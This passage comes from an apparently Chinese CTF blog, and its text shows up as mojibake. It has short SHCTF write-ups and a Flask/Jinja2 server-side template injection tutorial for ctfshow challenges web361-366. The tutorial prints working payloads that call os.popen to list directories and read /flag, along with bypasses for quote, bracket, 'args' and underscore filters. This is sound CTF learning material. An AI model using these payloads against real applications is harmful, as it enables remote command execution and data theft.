(String)$_POST[&#39;c_ode&#39;];</code>çš„é—®é¢˜ï¼Œåœ¨æœ¬åœ°phpç¯å¢ƒæµ‹è¯•ä¸€ä¸‹<br>å¦‚æœé™¤å»(string)é‚£ä¹ˆæ˜¯å¯ä»¥ç»•è¿‡stripos()è¾“å‡ºflag<br>è¿™é‡Œä½¿ç”¨var_dump()æ˜¾ç¤ºcodeçš„å€¼<br><img src="/images/TK6POUBOSXRE.png"><br>åŠ ä¸Š(string)<br><img src="/images/G5KY8TSRG0JPV1NTDH.png"><br>å¯ä»¥çœ‹å‡ºé—®é¢˜æ‰€åœ¨ï¼ŒstringæŠŠæ•°ç»„ARRAYå¼ºè½¬åŒ–<br>Array!&#x3D;&#x3D;2023SHCTF,æ‰€ä»¥æ²¡æœ‰ç»•è¿‡<br>æ‰€ä»¥ä¸èƒ½ç”¨æ•°ç»„<br>%20å’Œ%0aä¹Ÿä¸è¡Œï¼Œå› ä¸º&#x2F;isè¿‡æ»¤äº†æ¢è¡Œä¸ç©ºæ ¼<br>é‚£ä¹ˆåªæœ‰ä½¿ç”¨PCREå›æº¯æ¬¡æ•°é™åˆ¶<br>å†™ä¸€ä¸ªç®€å•çš„ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">1000000</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br></code></pre></td></tr></table></figure><p>åœ¨æœ€ååŠ å…¥2023SHCTFå¾—åˆ°flag</p><h2 id="WEEK1-ç™»å½•å°±ç»™flag"><a href="#WEEK1-ç™»å½•å°±ç»™flag" class="headerlink" title="[WEEK1]ç™»å½•å°±ç»™flag"></a>[WEEK1]ç™»å½•å°±ç»™flag</h2><p>åŒé¸¡è¡¨æ¡†ä¼šæœ‰å†å²è®°å½•ï¼Œè¯•å‡ºæ¥æœ€åçš„ç­”æ¡ˆæ˜¯</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">username:<span class="hljs-keyword">admin</span><br><span class="hljs-keyword">password</span>:<span class="hljs-keyword">password</span><br></code></pre></td></tr></table></figure><h2 id="WEEK1-é£æœºå¤§æˆ˜"><a href="#WEEK1-é£æœºå¤§æˆ˜" class="headerlink" title="[WEEK1]é£æœºå¤§æˆ˜"></a>[WEEK1]é£æœºå¤§æˆ˜</h2><p>jsæ–‡ä»¶æ‰“å¼€ï¼Œçœ‹åˆ°æœ‰ä¸ªUnicodeåŠ å¯†æ ¼å¼</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clojure"><span class="hljs-character">\u005a</span><span class="hljs-character">\u006d</span><span class="hljs-character">\u0078</span><span class="hljs-character">\u0068</span><span class="hljs-character">\u005a</span><span class="hljs-character">\u0033</span><span class="hljs-character">\u0073</span><span class="hljs-character">\u0033</span><span class="hljs-character">\u004d</span><span class="hljs-character">\u0032</span><span class="hljs-character">\u0056</span><span class="hljs-character">\u006a</span><span class="hljs-character">\u0059</span><span class="hljs-character">\u007a</span><span class="hljs-character">\u006b</span><span class="hljs-character">\u0030</span><span class="hljs-character">\u0059</span><span class="hljs-character">\u0069</span><span class="hljs-character">\u0030</span><span class="hljs-character">\u0033</span><span class="hljs-character">\u005a</span><span class="hljs-character">\u0057</span><span class="hljs-character">\u0052</span><span class="hljs-character">\u0069</span><span class="hljs-character">\u004c</span><span class="hljs-character">\u0054</span><span class="hljs-character">\u0051</span><span class="hljs-character">\u0078</span><span class="hljs-character">\u004e</span><span class="hljs-character">\u006a</span><span class="hljs-character">\u0049</span><span class="hljs-character">\u0074</span><span class="hljs-character">\u004f</span><span class="hljs-character">\u0044</span><span class="hljs-character">\u0051</span><span class="hljs-character">\u0033</span><span class="hljs-character">\u004f</span><span class="hljs-character">\u0053</span><span class="hljs-character">\u0031</span><span class="hljs-character">\u006b</span><span class="hljs-character">\u004d</span><span class="hljs-character">\u0054</span><span class="hljs-character">\u005a</span><span class="hljs-character">\u006d</span><span class="hljs-character">\u005a</span><span class="hljs-character">\u0054</span><span class="hljs-character">\u0067</span><span class="hljs-character">\u0034</span><span class="hljs-character">\u004e</span><span class="hljs-character">\u0044</span><span class="hljs-character">\u0041</span><span class="hljs-character">\u0034</span><span class="hljs-character">\u0059</span><span class="hljs-character">\u006a</span><span class="hljs-character">\u005a</span><span class="hljs-character">\u0039</span><span class="hljs-character">\u000a</span><br></code></pre></td></tr></table></figure><p>è§£ç åbase64å†è§£ç è·å¾—flag</p><p>æˆ–è€…æ§åˆ¶å°å‘é€scores&#x3D;100000000</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ssti</title>
    <link href="/2023/10/22/ssti/"/>
    <url>/2023/10/22/ssti/</url>
    
    <content type="html"><![CDATA[<h1 id="SSTIæ¼æ´åŸç†"><a href="#SSTIæ¼æ´åŸç†" class="headerlink" title="SSTIæ¼æ´åŸç†"></a>SSTIæ¼æ´åŸç†</h1><p><a href="https://www.freebuf.com/articles/web/345059.html">SSTIæ¼æ´åŸç†</a><br><strong>å¸¸ç”¨æ–¹æ³•</strong></p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-variable">__class__</span>           æŸ¥çœ‹å¯¹è±¡æ‰€åœ¨çš„ç±»<br><span class="hljs-variable">__mro__</span>             æŸ¥çœ‹ç»§æ‰¿å…³ç³»å’Œè°ƒç”¨é¡ºåºï¼Œè¿”å›å…ƒç»„<br><span class="hljs-variable">__base__</span>            è¿”å›åŸºç±»<br><span class="hljs-variable">__bases__</span>           è¿”å›åŸºç±»å…ƒç»„<br><span class="hljs-variable">__subclasses__</span>()    è¿”å›å­ç±»åˆ—è¡¨<br><span class="hljs-variable">__init__</span>            è°ƒç”¨åˆå§‹åŒ–å‡½æ•°ï¼Œå¯ä»¥ç”¨æ¥è·³åˆ°<span class="hljs-variable">__globals__</span><br><span class="hljs-variable">__globals__</span>         è¿”å›å‡½æ•°æ‰€åœ¨çš„å…¨å±€å‘½åç©ºé—´æ‰€å®šä¹‰çš„å…¨å±€å˜é‡ï¼Œè¿”å›å­—å…¸<br><span class="hljs-variable">__builtins__</span>        è¿”å›å†…å»ºå†…å»ºåç§°ç©ºé—´å­—å…¸<br><span class="hljs-variable">__dic__</span>              ç±»çš„é™æ€å‡½æ•°ã€ç±»å‡½æ•°ã€æ™®é€šå‡½æ•°ã€å…¨å±€å˜é‡ä»¥åŠä¸€äº›å†…ç½®çš„å±æ€§éƒ½æ˜¯æ”¾åœ¨ç±»çš„<span class="hljs-variable">__dict__</span>é‡Œ<br><span class="hljs-variable">__getattribute__</span>()   å®ä¾‹ã€ç±»ã€å‡½æ•°éƒ½å…·æœ‰çš„<span class="hljs-variable">__getattribute__</span>é­”æœ¯æ–¹æ³•ã€‚äº‹å®ä¸Šï¼Œåœ¨å®ä¾‹åŒ–çš„å¯¹è±¡è¿›è¡Œ.æ“ä½œçš„æ—¶å€™ï¼ˆå½¢å¦‚:a.xxx/a.xxx()ï¼‰éƒ½ä¼šè‡ªåŠ¨å»è°ƒç”¨<span class="hljs-variable">__getattribute__</span>æ–¹æ³•ã€‚å› æ­¤æˆ‘ä»¬åŒæ ·å¯ä»¥ç›´æ¥é€šè¿‡è¿™ä¸ªæ–¹æ³•æ¥è·å–åˆ°å®ä¾‹ã€ç±»ã€å‡½æ•°çš„å±æ€§ã€‚<br><span class="hljs-variable">__getitem__</span>()        è°ƒç”¨å­—å…¸ä¸­çš„é”®å€¼ï¼Œå…¶å®å°±æ˜¯è°ƒç”¨è¿™ä¸ªé­”æœ¯æ–¹æ³•ï¼Œæ¯”å¦‚a[<span class="hljs-string">&#x27;b&#x27;</span>]ï¼Œå°±æ˜¯a.<span class="hljs-variable">__getitem__</span>(<span class="hljs-string">&#x27;b&#x27;</span>)<br><span class="hljs-variable">__builtins__</span>         å†…å»ºåç§°ç©ºé—´ï¼Œå†…å»ºåç§°ç©ºé—´æœ‰è®¸å¤šåå­—åˆ°å¯¹è±¡ä¹‹é—´æ˜ å°„ï¼Œè€Œè¿™äº›åå­—å…¶å®å°±æ˜¯å†…å»ºå‡½æ•°çš„åç§°ï¼Œå¯¹è±¡å°±æ˜¯è¿™äº›å†…å»ºå‡½æ•°æœ¬èº«ã€‚å³é‡Œé¢æœ‰å¾ˆå¤šå¸¸ç”¨çš„å‡½æ•°ã€‚<span class="hljs-variable">__builtins__</span>ä¸<span class="hljs-variable">__builtin__</span>çš„åŒºåˆ«å°±ä¸æ”¾äº†ï¼Œç™¾åº¦éƒ½æœ‰ã€‚<br><span class="hljs-variable">__import__</span>           åŠ¨æ€åŠ è½½ç±»å’Œå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯å¯¼å…¥æ¨¡å—ï¼Œç»å¸¸ç”¨äºå¯¼å…¥osæ¨¡å—ï¼Œ<span class="hljs-variable">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;ls&#x27;</span>).read()]<br><span class="hljs-variable">__str__</span>()            è¿”å›æå†™è¿™ä¸ªå¯¹è±¡çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥ç†è§£æˆå°±æ˜¯æ‰“å°å‡ºæ¥ã€‚<br>url_for              flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°<span class="hljs-variable">__builtins__</span>ï¼Œè€Œä¸”url_for.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>]å«æœ‰current_app<br>get_flashed_messages flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°<span class="hljs-variable">__builtins__</span>ï¼Œè€Œä¸”url_for.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>]å«æœ‰current_app<br>lipsum               flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°<span class="hljs-variable">__builtins__</span>ï¼Œè€Œä¸”lipsum.<span class="hljs-variable">__globals__</span>å«æœ‰osæ¨¡å—ï¼š&#123;&#123;lipsum.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;ls&#x27;</span>).read()&#125;&#125;<br>&#123;&#123;cycler.<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>.os.popen(<span class="hljs-string">&#x27;ls&#x27;</span>).read()&#125;&#125;<br>current_app          åº”ç”¨ä¸Šä¸‹æ–‡ï¼Œä¸€ä¸ªå…¨å±€å˜é‡<br>request              å¯ä»¥ç”¨äºè·å–å­—ç¬¦ä¸²æ¥ç»•è¿‡ï¼ŒåŒ…æ‹¬ä¸‹é¢è¿™äº›ï¼Œå¼•ç”¨ä¸€ä¸‹ç¾½å¸ˆå‚…çš„ã€‚æ­¤å¤–ï¼ŒåŒæ ·å¯ä»¥è·å–openå‡½æ•°:request.<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].open(<span class="hljs-string">&#x27;/proc\self\fd/3&#x27;</span>).read()<br>request.args.x1    <span class="hljs-built_in">get</span>ä¼ å‚<br>request.values.x1  æ‰€æœ‰å‚æ•°<br>request.cookies      cookieså‚æ•°<br>request.headers      è¯·æ±‚å¤´å‚æ•°<br>request.form.x1    postä¼ å‚(Content-<span class="hljs-built_in">Type</span>:applicaation/x-www-form-urlencodedæˆ–multipart/form-data)<br>request.data   postä¼ å‚(Content-<span class="hljs-built_in">Type</span>:a/b)<br>request.json postä¼ json  (Content-<span class="hljs-built_in">Type</span>: application/json)<br>config               å½“å‰applicationçš„æ‰€æœ‰é…ç½®ã€‚æ­¤å¤–ï¼Œä¹Ÿå¯ä»¥è¿™æ ·&#123;&#123;config.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;ls&#x27;</span>).read() &#125;&#125;<br><br></code></pre></td></tr></table></figure><h2 id="web361-362"><a href="#web361-362" class="headerlink" title="web361-362"></a>web361-362</h2><p>hintï¼šåå­—å°±æ˜¯è€ƒç‚¹<br>è¡¨ç¤ºæœ‰ä¸ªnameå˜é‡</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">?name=<span class="hljs-number">1</span><br><span class="hljs-regexp">//</span>noneå›æ˜¾<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>hackbarä¸Šæœ‰å¾ˆå¤šç°æˆçš„æ¨¡æ¿ï¼Œå¾ˆå¤šéƒ½å¯ä»¥ç›´æ¥ç”¨<br>payload:</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">g.pop.__globals__.__builtins__</span>[&#x27;__import__&#x27;](<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">//app.py</span><br><span class="language-xml"></span><br><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">g.pop.__globals__.__builtins__</span>[&#x27;__import__&#x27;](<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">&#x27;ls /&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">//app bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr var</span><br><span class="language-xml"></span><br><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">g.pop.__globals__.__builtins__</span>[&#x27;__import__&#x27;](<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">//ctfshow&#123;528550d1-1770-4688-aeb3-68030ed8dc49&#125;</span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure><h2 id="web363"><a href="#web363" class="headerlink" title="web363"></a>web363</h2><p>æœ¬é¢˜è¿‡æ»¤äº†å•å¼•å·å’ŒåŒå¼•å·<br>ç»•è¿‡è¿‡æ»¤å¯ä»¥ç”¨request.args<br><a href="https://xz.aliyun.com/t/6885">ä¼ é€é—¨</a><br>å‡è®¾ä¼ å…¥<code>&#123;&#123;url_for.__globals__.__builtins__['__import__']('os').popen('ls').read()&#125;&#125;</code>,å› ä¸ºå¼•å·è¢«è¿‡æ»¤ï¼Œæ‰€ä»¥æ— æ³•æ‰§è¡Œï¼Œå¯ä»¥æŠŠ<code>[&#39;__import__&#39;]</code>æ¢æˆ[request.args.a]<br>è€Œ(â€˜osâ€™)æ¢æˆ(request.args.b)(è¿™é‡Œçš„a,bå¯ä»¥ç†è§£ä¸ºè‡ªå®šä¹‰çš„å˜é‡ï¼Œåå­—å¯ä»¥ä»»æ„è®¾ç½®)<br>éšååœ¨åé¢ä¼ å…¥a,bçš„å€¼ï¼Œå˜æˆ<code>&#123;&#123;url_for.__globals__.__builtins__[request.args.a](request.args.b).popen(request.args.c).read()&#125;&#125;&amp;a=__import__&amp;b=os&amp;c=ls</code>ï¼Œä¸åŸå‘½ä»¤ç­‰æ•ˆ</p><p>payload:</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">url_for.__globals__.__builtins__</span>[request.args.a](<span class="hljs-name">request.args.b</span>).popen(<span class="hljs-name">request.args.c</span>).read()&#125;&#125;</span><span class="language-xml">&amp;a=__import__&amp;b=os&amp;c=ls</span><br><span class="language-xml">//app.py</span><br><span class="language-xml"></span><br><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">url_for.__globals__.__builtins__</span>[request.args.a](<span class="hljs-name">request.args.b</span>).popen(<span class="hljs-name">request.args.c</span>).read()&#125;&#125;</span><span class="language-xml">&amp;a=__import__&amp;b=os&amp;c=ls /</span><br><span class="language-xml">//app bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr var</span><br><span class="language-xml"></span><br><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">url_for.__globals__.__builtins__</span>[request.args.a](<span class="hljs-name">request.args.b</span>).popen(<span class="hljs-name">request.args.c</span>).read()&#125;&#125;</span><span class="language-xml">&amp;a=__import__&amp;b=os&amp;c=cat /flag</span><br><span class="language-xml">//ctfshow&#123;f2687c32-3db3-4c1c-be8b-fa160a8c3e70&#125;</span><br></code></pre></td></tr></table></figure><h2 id="web364"><a href="#web364" class="headerlink" title="web364"></a>web364</h2><p>æœ¬é¢˜è¿‡æ»¤äº†å•åŒå¼•å·ï¼Œè¿˜è¿‡æ»¤äº†args<br>ä½†æ˜¯æˆ‘ä»¬ä»ç„¶èƒ½ç”¨ä¸Šé¢˜çš„æ–¹æ³•ï¼Œç”¨cookiesæ¥ä»£æ›¿args<br>payload:</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">GET:</span><br><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">url_for.__globals__.__builtins__</span>[request.cookies.a](<span class="hljs-name">request.cookies.b</span>).popen(<span class="hljs-name">request.cookies.c</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">COOKIES:</span><br><span class="language-xml">a=__import__;b=os;c=ls</span><br></code></pre></td></tr></table></figure><p>æ–¹æ³•äºŒï¼šchar()ç»•è¿‡<br>ç”¨ä¸‹é¢çš„payloadåˆ¤æ–­chr()å‡½æ•°çš„ä½ç½®</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">&#123;&#123;().<span class="hljs-emphasis">__class__</span>.<span class="hljs-emphasis">__bases__</span>[0].<span class="hljs-emphasis">__subclasses__</span>()[0].<span class="hljs-emphasis">__init__</span>.<span class="hljs-emphasis">__globals__</span>.<span class="hljs-emphasis">__builtins__</span>.chr&#125;&#125;<br></code></pre></td></tr></table></figure><p>åœ¨burpsuiteé‡Œçˆ†ç ´<br><img src="/images/N2MCN3WWEP2J0I.png"></p><p><img src="/images/GQR2HB64V2PTRU.png" alt="å‚æ•°"></p><p>çˆ†ç ´å®Œé€‰æ‹©çŠ¶æ€ä¸º200çš„<br><img src="/images/IWFCK25CU2JZIQK.png"><br>ä»¥80ä¸ºä¾‹</p><p>è¿™ä¸ªçˆ†ç ´ç»“æœæ„å‘³ç€<code>__subclasses__()[80]</code>ä¸­å«æœ‰chrçš„ç±»ç´¢å¼•ï¼Œå³å¯ä»¥ä½¿ç”¨chr()</p><p>æ¥ä¸‹æ¥æŠŠè¿™ä¸€ä¸²<code>&#123;%set+chr=[].__class__.__bases__[0].__subclasses__()[80].__init__.__globals__.__builtins__.chr%&#125;</code>æ”¾åˆ°å‰é¢</p><p>åŸå§‹payloadæ˜¯<code>&#123;&#123; config.__class__.__init__.__globals__['os'].popen('cat /flag').read() &#125;&#125;</code>ï¼Œæ¥ä¸‹æ¥è¦ç”¨chr()è¿›è¡Œæ›¿æ¢ï¼Œå¯¹ç…§asciiè¡¨</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-string">&#x27;os&#x27;</span>æ›¿æ¢æˆchr<span class="hljs-comment">(111)</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>bchr<span class="hljs-comment">(115)</span><br><span class="hljs-string">&#x27;cat /flag&#x27;</span>æ›¿æ¢æˆchr<span class="hljs-comment">(99)</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>bchr<span class="hljs-comment">(97)</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>bchr<span class="hljs-comment">(116)</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>bchr<span class="hljs-comment">(32)</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>bchr<span class="hljs-comment">(47)</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>bchr<span class="hljs-comment">(102)</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>bchr<span class="hljs-comment">(108)</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>bchr<span class="hljs-comment">(97)</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>bchr<span class="hljs-comment">(103)</span><br></code></pre></td></tr></table></figure><p>æŠŠæ›¿æ¢åçš„payloadæ”¾åœ¨åé¢ï¼Œä¸¤æ®µæ‹¼åœ¨ä¸€èµ·å¾—åˆ°æœ€ç»ˆå§¿åŠ¿</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?name=&#123;%set+chr=[].__class__.__bases__[0].__subclasses__()[80].__init__.__globals__.__builtins__.chr%&#125;</span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">config.__class__.__init__.__globals__</span>[chr(111)%2bchr(115)].popen(<span class="hljs-name">chr</span>(<span class="hljs-name">99</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">97</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">116</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">32</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">47</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">102</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">108</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">97</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">103</span>)).read() &#125;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="web365"><a href="#web365" class="headerlink" title="web365"></a>web365</h2><p>å¯¹æ¯”ä¸Šä¸€é¢˜å¤šè¿‡æ»¤äº†ä¸€ä¸ªä¸­æ‹¬å·</p><p>ä¸­æ‹¬å·ç»•è¿‡<br>å¯ä»¥ç”¨<code>__getitem__</code>å’Œ<code>pop</code>ä»£æ›¿,ä½†å› ä¸ºpopä¼šç ´åæ•°ç»„çš„ç»“æ„ï¼Œæ‰€ä»¥æ›´æ¨èç”¨<code>__getitem__</code></p><p>ä¸Šé¢˜çš„payloadæ”¹ä¸€æ”¹</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?name=&#123;%set+chr=[].__class__.__bases__[0].__subclasses__()[80].__init__.__globals__.__builtins__.chr%&#125;</span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">config.__class__.__init__.__globals__</span>[chr(111)%2bchr(115)].popen(<span class="hljs-name">chr</span>(<span class="hljs-name">99</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">97</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">116</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">32</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">47</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">102</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">108</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">97</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">103</span>)).read() &#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">ç¬¬ä¸€å¤„çš„[]æ”¹ä¸º()</span><br><span class="language-xml">ç¬¬äºŒä½çš„[0]æ”¹ä¸º__getitem__(0)æˆ–è€…ç›´æ¥åˆ å»</span><br><span class="language-xml">ç¬¬ä¸‰å¤„çš„[80]æ”¹ä¸º.__getitem__(80)</span><br><span class="language-xml">ç¬¬å››å¤„çš„[chr(111)%2bchr(115)]æ”¹ä¸º.__getitem__(chr(111)%2bchr(115))</span><br></code></pre></td></tr></table></figure><p>å¾®æ“å¥½çš„payloadå¦‚ä¸‹</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?name=&#123;%set+chr=().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(80).__init__.__globals__.__builtins__.chr%&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config.__class__.__init__.__globals__.__getitem__</span>(<span class="hljs-name">chr</span>(<span class="hljs-name">111</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">115</span>)).popen(<span class="hljs-name">chr</span>(<span class="hljs-name">99</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">97</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">116</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">32</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">47</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">102</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">108</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">97</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">103</span>)).read() &#125;&#125;</span><br></code></pre></td></tr></table></figure><p>ä¸Šé¢˜æ–¹æ³•ä¸€çš„payloadä¹Ÿæ˜¯å¦‚æ­¤</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">GET:</span><br><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">url_for.__globals__.__builtins__.__getitem__</span>(<span class="hljs-name">request.cookies.a</span>)(<span class="hljs-name">request.cookies.b</span>).popen(<span class="hljs-name">request.cookies.c</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">COOKIES:</span><br><span class="language-xml">a=__import__;b=os;c=ls</span><br></code></pre></td></tr></table></figure><h2 id="web366-â€“è¿‡æ»¤ä¸‹åˆ’çº¿ã€å•å¼•å·ã€argsã€ä¸­æ‹¬å·"><a href="#web366-â€“è¿‡æ»¤ä¸‹åˆ’çº¿ã€å•å¼•å·ã€argsã€ä¸­æ‹¬å·" class="headerlink" title="web366 â€“è¿‡æ»¤ä¸‹åˆ’çº¿ã€å•å¼•å·ã€argsã€ä¸­æ‹¬å·"></a>web366 â€“è¿‡æ»¤ä¸‹åˆ’çº¿ã€å•å¼•å·ã€argsã€ä¸­æ‹¬å·</h2><p>æœ¬é¢˜å¤šè¿‡æ»¤äº†ä¸‹åˆ’çº¿ï¼Œåœ¨ä¸Šé¢çš„åŸºç¡€ä¸Šè¦ç»•è¿‡url_forå’Œ__globals__<br>è¿™é‡Œç”¨attræ–¹æ³•ï¼š</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-string">&quot;&quot;</span>|<span class="hljs-function"><span class="hljs-title">attr</span>(<span class="hljs-string">&quot;__class__&quot;</span>)</span><br>ç›¸å½“äº<br><span class="hljs-string">&quot;&quot;</span>.__class__<br></code></pre></td></tr></table></figure><p>æ„é€ payloadï¼š</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;(<span class="hljs-name">lipsum</span>|attr(<span class="hljs-name">request.cookies.a</span>)).os.popen(<span 